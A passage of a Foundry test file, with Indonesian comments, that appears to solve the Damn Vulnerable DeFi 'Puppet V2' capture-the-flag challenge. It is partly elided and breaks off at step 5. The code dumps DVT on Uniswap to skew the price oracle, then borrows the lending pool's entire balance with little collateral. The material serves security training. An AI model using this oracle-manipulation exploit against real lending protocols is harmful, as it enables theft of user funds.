...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public checkSolvedByPlayer {
        // 1. Manipulasi harga: swap semua DVT → WETH di Uniswap
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // swapExactTokensForTokens memanggil dari player (karena prank aktif)
        ...
        // 2. Wrap ETH player jadi WETH
        // `value` ETH akan dikurangi dari player.balance karena prank
        weth.deposit{ value: player.balance }();

        // 3. Hitung deposit WETH yang diperlukan dan approve ke pool
        uint256 required = lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );
        weth.approve(address(lendingPool), required);

        // 4. Borrow semua DVT dari pool
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // 5. Kirim hasil pinjaman DVT ke akun recovery
